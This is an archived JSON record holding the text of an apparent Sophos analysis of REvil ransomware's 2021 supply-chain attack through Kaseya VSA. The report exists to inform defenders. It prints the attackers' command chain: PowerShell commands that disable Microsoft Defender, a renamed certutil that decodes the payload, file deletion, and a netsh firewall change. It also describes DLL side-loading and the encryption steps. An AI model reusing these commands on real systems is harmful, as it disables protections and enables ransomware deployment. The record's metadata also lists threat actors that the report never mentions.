{
    "id": "c9c39abb-98f3-4222-a4f1-f2c0bad32316",
    "created_at": "2023-01-12T15:04:12.058346Z",
    "updated_at": "2025-03-27T02:16:26.181402Z",
    "deleted_at": null,
    "sha1_hash": "e112595b5d753c5ea0ac976a86bf612f6f80b6b9",
    "title": "2021-07-04 - Independence Day- REvil uses supply chain exploit to attack hundreds of businesses",
    "authors": "",
    "file_creation_date": "2022-05-28T15:18:59Z",
    "file_modification_date": "2022-05-28T15:18:59Z",
    "file_size": 3656344,
    "plain_text": "# Independence Day: REvil uses supply chain exploit to attack hundreds of businesses\n\n**news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-**\nbusinesses\n\nJuly 4, 2021\n\nOn July 2, while many businesses had staff either already off or preparing for a long holiday\nweekend, an affiliate of the REvil ransomware group launched a widespread crypto-extortion\n[gambit. Using an exploit of Kaseya’s VSA remote management service, the REvil actors](https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689)\nlaunched a malicious update package that targeted customers of managed service providers\nand enterprise users of the on-site version of Kaseya’s VSA remote monitoring and\nmanagement platform.\n\nREvil is a ransomware-as-a-service (RaaS), delivered by “affiliate” actor groups who are paid\nby the ransomware’s developers. Customers of managed service providers have been a\ntarget of REvil affiliates and other ransomware operators in the past, including a ransomware\noutbreak in 2019 (later attributed to REvil) that affected over 20 small local governments in\nTexas. And with the decline of several other RaaS offerings, REvil has become more active.\n[Its affiliates have been exceedingly persistent in their efforts as of late, continuously working](https://news.sophos.com/en-us/2021/06/11/relentless-revil-revealed/)\nto subvert malware protection. In this particular outbreak, the REvil actors not only found a\nnew vulnerability in Kaseya’s supply chain, but used a malware protection program as the\ndelivery vehicle for the REvil ransomware code.\n\n\n-----\n\nSpike in SophosLabs telemetry caused by REvil detections on July 2, 2021, showing\nhundreds of detections at its peak.\nREvil’s operators posted to their “Happy Blog” today, claiming that more than a million\nindividual devices were infected by the malicious update. They also said that they would be\nwilling to provide a universal decryptor for victims of the attack, but under the condition that\nthey be paid $70,000,000 worth of BitCoin.\n\n## Managed Malware Delivery\n\nThe outbreak was delivered via a malicious update payload sent out from compromised VSA\nservers to the VSA agent applications running on managed Windows devices. It appears this\nwas achieved using a zero-day exploit of the server platform. This gave REvil cover in\nseveral ways: it allowed initial compromise through a trusted channel, and leveraged trust in\n[the VSA agent code—reflected in anti-malware software exclusions that Kaseya requires for](https://helpdesk.kaseya.com/hc/en-gb/articles/229014948-Anti-Virus-Exclusions-and-Trusted-Apps)\nset-up for its application and agent “working” folders. Anything executed by the Kaseya\nAgent Monitor is therefore ignored because of those exclusions—which allowed REvil to\ndeploy its dropper without scrutiny.\n\n\n-----\n\nThe Kaseya Agent Monitor (at C:\\PROGRAM FILES (X86)\\KASEYA\\<ID>\\AGENTMON.EXE,\nwith the ID being the identification key for the server connected to the monitor instance) in\nturn wrote out the Base64-encoded malicious payload AGENT.CRT to the VSA agent\n“working” directory for updates (by default, C:\\KWORKING\\). AGENT.CRT is encoded to\nprevent malware defenses from performing static file analysis with pattern scanning and\nmachine learning when it is dropped.These technologies normally work on executable files\n(though, as we’ve noted, since this file was deployed within the “working” directory excluded\nunder Kaseya’s requirements, this would not likely have come into play.)\n\nAfter deploying the payload, the Kaseya agent then ran the following Windows shell\ncommands, concatenated into a single string:\n\nThe command line executed by the malicious Kaseya update.\nHere’s a breakdown of what’s going on here:\n\n**ping 127.0.0.1 -n 5693 > nul**\n\nThe first command is essentially a timer. The PING command has a -n parameter which\ninstructs the Windows PING.EXE tool to send echo requests to the localhost (127.0.0.1)—in\nthis case, 5,693 of them. This acted as a “sleep” function, delaying the subsequent\nPowerShell command for 5,693 seconds—roughly 94 minutes. The value 5,693 varied per\nvictim, indicating that the number was randomly generated on each VSA server as part of the\nagent procedure that sent the malicious command down to victims.\n\n**C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -**\n**DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -**\n**DisableIOAVProtection $true -DisableScriptScanning $true -**\n**EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force**\n**-MAPSReporting Disabled -SubmitSamplesConsent NeverSend**\n\nThe next part of the command string is a PowerShell command that attempts to disable core\nmalware and anti-ransomware protections offered by Microsoft Defender:\n\nReal-time protection\nNetwork protection against exploitation of known vulnerabilities\nScanning of all downloaded files and attachments\nScanning of scripts\nRansomware protection\n\n\n-----\n\nProtection that prevents any application from gaining access to dangerous domains\nthat may host phishing scams, exploits, and other malicious content on the Internet\nSharing of potential threat information with Microsoft Active Protection Service (MAPS)\nAutomatic sample submission to Microsoft\n\nThese features are turned off to prevent Microsoft Defender from potentially blocking\nsubsequent malicious files and activity.\n\n**copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe**\n\nThis creates a copy of the Windows certificate utility, CERTUTIL.EXE—a frequently used\nLiving-Off-the-Land Binary (LOLBin), capable of downloading and decoding web-encoded\ncontent. The copy is written to C:\\WINDOWS\\CERT.EXE.\n\n**echo %RANDOM% >> C:\\Windows\\cert.exe**\n\nThis appends a random 5-digit number to the end of the copied CERTUTIL. This may have\nbeen an attempt to prevent anti-malware products that watch for CERTUTIL abuse from\nrecognizing CERT.EXE as a CERTUTIL copy by signature.\n\n**C:\\Windows\\cert.exe -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe**\n\nThe copied CERTUTIL is used to decode the Base64-encoded payload file AGENT.CRT and\nwrite it to an executable, AGENT.EXE, in the Kaseya working folder. AGENT.EXE has a\nvalid Authenticode, signed with a certificate for “PB03 TRANSPORT LTD.” We have only\nseen this certificate associated with REvil malware; it may be stolen or fraudulently obtained.\nAGENT.EXE contains a compiler timestamp of July 1, 2021 (14:40:29) – a day before the\nattack.\n\n\n-----\n\nThe digital signature on the REvil Kaseya dropper.\n**del /q /f c:\\kworking\\agent.crt C:\\Windows\\cert.exe**\n\nThe original payload file C:\\KWORKING\\AGENT.CRT and the copy of CERTUTIL are\ndeleted.\n\n**c:\\kworking\\agent.exe**\n\nFinally, AGENT.EXE is started by Kaseya’s AGENTMON.EXE process (inheriting its systemlevel privilege)—and the actual dropping of ransomware begins.\n\n## Side-loading for stealth\n\n\n-----\n\nThe disassembled code of AGENT.EXE.\nAGENT.EXE dropped an unexpected file: MSMPENG.EXE, an outdated and expired version\nof Microsoft’s Antimalware Service executable. This is a benign yet vulnerable application\nfrom Windows Defender, version 4.5.218.0, signed by Microsoft on March 23, 2014:\n\n\n-----\n\nThis version of MSMPENG.EXE is vulnerable to side-loading attacks—and we’ve seen this\nparticular version of the application abused before. In a side-load attack, malicious code is\nput into a dynamic link library (DLL) named to match one required by the targeted\nexecutable, and usually placed into the same folder as the executable so it is found before a\nlegitimate copy.\n\n\n-----\n\nIn this case, AGENT.EXE dropped a malicious file named MPSVC.DLL alongside the\nMSMPENG.EXE executable. AGENT.EXE then executes MSMPENG.EXE, which detects\nthe malicious MPSVC.DLL file and loads it into its own memory space.\n\nThe MPSVC.DLL also contains the “PB03 TRANSPORT LTD.” certificate that was applied to\nAGENT.EXE. The MPSVC.DLL appears to have been compiled on Thursday July 1, 2021\n(14:39:06), just prior to the compilation of AGENT.EXE.\n\nFrom that moment on, the malicious code in MPSVC.DLL hijacks the normal execution flow\nof the Microsoft branded process, when MSMPENG.EXE calls the ServiceCrtMain function in\nthe malicious MPSVC.DLL (this is also the main function in a benign MPSVC.DLL):\n\nOnce the DLL is loaded into memory, the malware deletes it from disk.\n\nThe MSMPENG.EXE, now under control of the malicious MPSVC.DLL, begins to encrypt the\nlocal disk, connected removable drives and mapped network drives, all from a Microsoft\nsigned application that security controls typically trust and allow to run unhindered.\n\nFrom here on out, this REvil ransomware is technically very similar to other recent REvil\nextortion operations. It executes a NetShell (netsh) command to change firewall settings to\nallow the local Windows system to be discovered on the local network by other computers\n(netsh advfirewall firewall set rule group=”Network Discovery” new enable=Yes ). Then\nit begins encrypting files.\n\nThe REvil ransomware performs an in-place encryption attack, and so the encrypted\ndocuments are stored on the same sectors as the original unencrypted document, making it\nimpossible to recover the originals with data recovery tools. REvil’s efficient file system\nactivity shows specific operations, performed on dedicated threads:\n\nThe ransomware runs storage access (the reading of original documents and writing of\nencrypted document), key-blob embedding, and document renaming on multiple individual\nthreads for doing faster damage. As each file is encrypted, a random extension is added to\nthe end of its name.\n\n**Step** **Thread** **Operation** **Purpose**\n\n1 A CreateFile (Generic Read) Open original document for reading only.\n\n2 A ReadFile Read last 232 bytes of original document\n(look for decryption blob.)\n\n\n-----\n\n3 A CloseFile Close original document (no changes\nmade.)\n\n\n4 A CreateFile (Generic\nRead/Write)\n\n\nOpen original document for reading and\nwriting.\n\n\n5 B ReadFile Read original document.\n\n6 C WriteFile Write encrypted document in original\ndocument.\n\n7 C WriteFile Add decryption blob, 232 bytes, to end of\nfile.\n\n8 B CloseFile Close now-encrypted document.\n\n\n9 B CreateFile (Read\nAttributes)\n\n\nOpen encrypted document.\n\n\n10 B SetRenameInformationFile Rename document by adding a file type\nextension, for example ‘.w3d1s’.\n\n11 B CloseFile Close now renamed encrypted file.\n\nA ransom note is dropped using the same random extension as part of the filename (for\nexample, “39ats40-readme.txt”.)\n\n\n-----\n\nThere are some factors that stand out in this attack when compared to others. First, because\nof its mass deployment, this REvil attack makes no apparent effort to exfiltrate data. Attacks\nwere customized to some degree based on the size of the organization, meaning that REvil\nactors had access to VSA server instances and were able to identify individual customers of\nMSPs as being different from larger organizations. And there was no sign of deletion of\nvolume shadow copies—a behavior common among ransomware that triggers many\nmalware defenses.\n\n\n-----\n\n0 The main install command\n\n1 PowerShell command attempts to stop Windows Defender\n\n2 Renamed CERTUTIL.EXE decodes AGENT.EXE from AGENT.CRT\n\n3 AGENT.EXE is executed, drops MSMPENG.EXE and MPSVC.DLL into C:\\Windows\n\n4 MSMPENG.EXE is executed, and side-loads the REvil DLL\n\n\n-----\n\n5 Netsh.exe turns on network discovery\n\n6 Files are encrypted, ransom note created\n\nHere’s a video demonstrating how the attack works:\n\nFollowing the directions in the ransom note brings victims to this page. Payment is\ndemanded in Monero:\n\nThe immediate ransom demanded for (most) victims in this attack is $45,000 US, rising to\n$90,000 after a week.\n\n\n-----\n\nThe ransomware Tor page provides instructions on how to buy Monero, allows a sample file\nto be decrypted, and provides a chat channel to REvil’s operators for negotiating the sale.\n\n## Lessons learned\n\nThe tactics to evade malware protection used here—poisoning a supply-chain well, taking\nadvantage of vendor carve-outs from malware protection, and side-loading with an otherwise\nbenign (and Microsoft-signed) process—are all very sophisticated. They also show the\npotential risks of excluding anti-malware protection from folders where automated tasks write\nand execute new files. While zero-day supply-chain exploits are rare, we’ve already seen two\nmajor systems management platforms exploited in the past year. While [Sunburst was](https://news.sophos.com/en-us/2020/12/21/how-sunburst-malware-does-defense-evasion/)\napparently a state-funded attack, ransomware operators clearly have the resources to\ncontinue to acquire additional exploits.\n\nEven so, the anti-malware evasion used by this REvil attack was not unstoppable, and was\ndetected by a number of antimalware products. The REvil payload itself was detectable by\nSophos as Mal/Generic-S by Intercept X, and Troj/Ransom-GIP and Troj/Ransom-GIS, as\nwell as HPmal/Sodino-A in on-premises protection products. The REvil-specific code\ncertificate is also detected as Mal/BadCert-Gen. While the protection exclusions may have\n\n\n-----\n\nallowed the REvil dropper to be installed on machines, the ransomware itself was detected.\nIntercept X’s cryptoransomware protection feature is not constrained by folder exclusions,\nand would block file encryption anywhere on protected drives.\n\n[A list of IOCs for this REvil attack is available on the SophosLabs Github page.](https://github.com/sophoslabs/IoCs/blob/master/Ransomware-REvil-Kaseya.csv)\n\n**SophosLabs wishes to acknowledge the contributions of Gabor Szappanos, Richard**\n**Cohen, and Fraser Howard to this report.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-04 - Independence Day- REvil uses supply chain exploit to attack hundreds of businesses.pdf"
    ],
    "report_names": [
        "2021-07-04 - Independence Day- REvil uses supply chain exploit to attack hundreds of businesses.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535852,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653751139,
    "ts_modification_date": 1653751139,
    "files": {
        "pdf": "https://archive.orkl.eu/e112595b5d753c5ea0ac976a86bf612f6f80b6b9.pdf",
        "text": "https://archive.orkl.eu/e112595b5d753c5ea0ac976a86bf612f6f80b6b9.txt",
        "img": "https://archive.orkl.eu/e112595b5d753c5ea0ac976a86bf612f6f80b6b9.jpg"
    }
}